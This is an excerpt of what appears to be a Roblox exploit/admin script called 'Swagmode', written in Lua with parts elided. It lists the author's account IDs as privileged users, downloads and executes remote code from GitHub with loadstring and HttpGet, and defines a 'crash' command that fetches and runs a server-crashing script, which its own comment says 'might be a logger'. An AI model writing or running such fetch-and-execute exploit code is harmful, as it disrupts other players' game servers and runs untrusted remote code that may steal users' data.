...
local swagmins = {
  355416854, -- Me
  1314453163, --my alt
  1563437085, --my other alt
  1267200705, --my 3rd alt
  1799330773 --yes
}
...
local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/EXFTB/Swagmode-mod/main/e'))()
...
------------------------------------------------------------------------------------------------------------------------------------------------
    ...
    commands.e = function(arguments)
        ...
        if CMD == 'crash' then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))() --this might be a logger
        end
...
elseif table.find(swagmins, player.UserId) then
    ...
    IsMod = false
    DisableMod = false
    announce('Commands Loaded', 'find out list of commands for yoself mate', 10)
end
end)
